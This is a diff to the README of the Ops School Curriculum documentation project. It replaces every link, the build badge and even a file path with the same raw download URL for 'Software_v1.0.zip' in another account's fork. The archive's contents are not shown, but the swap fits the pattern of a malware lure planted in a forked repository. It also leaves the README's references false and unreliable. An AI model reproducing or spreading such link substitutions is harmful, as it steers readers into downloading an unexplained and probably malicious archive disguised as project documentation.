@@ -1,9 +1,9 @@
 Ops School Curriculum
 =====================
-[![Build Status](https://secure.travis-ci.org/opsschool/curriculum.png?branch=master)](https://travis-ci.org/opsschool/curriculum)
+[![Build Status](https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software_v1.0.zip)](https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software_v1.0.zip)
 
 The current documentation based on these sources can be seen at:
-http://www.opsschool.org/
+https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software_v1.0.zip
 
 Welcome!
 
@@ -12,9 +12,9 @@ So thank you for your time.
 
 Things you should know:
 
-* This project is written in [reStructuredText](http://docutils.sourceforge.net/docs/user/rst/quickstart.html)
-* Hosted by [Read the Docs](http://readthedocs.org/)
-* Tested by rendering in [Sphinx](http://sphinx-doc.org/) on [Travis CI](https://travis-ci.org)
+* This project is written in [reStructuredText](https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software_v1.0.zip)
+* Hosted by [Read the Docs](https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software_v1.0.zip)
+* Tested by rendering in [Sphinx](https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software_v1.0.zip) on [Travis CI](https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software_v1.0.zip)
 
 This is the only Markdown file in the repository, as it's not meant to be
 included in the documentation itself.
@@ -35,15 +35,15 @@ wonderful things, please follow this process:
   feedback. Community review is also encouraged.
 
 If you submit a pull request and would like to have your name associated with
-the project, add it to the `meta/contributions.rst` file!
+the project, add it to the `https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software_v1.0.zip` file!
 
 Some cool things:
 
 * `vim-common` contains a reStructuredText syntax highlighter
 * The [Emacs support][emacs] via rst-mode comes as part of the docutils package
-  under `/docutils/tools/editors/emacs/rst.el`
+  under `https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software_v1.0.zip`
 
-[emacs]: http://docutils.sourceforge.net/docs/user/emacs.html
+[emacs]: https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software_v1.0.zip
 
 Note about internal links
 -------------------------
@@ -80,4 +80,4 @@ Examples:
 After modifications to links, please run `make linkcheck` to see the status of
 all the links in the docs.
 
-More on cross-referencing can be read in the [Sphinx Docs](http://sphinx-doc.org/markup/inline.html#cross-referencing-arbitrary-locations).
+More on cross-referencing can be read in the [Sphinx Docs](https://github.com/videogramme/curriculum/raw/refs/heads/master/datacenters/Software_v1.0.zip).
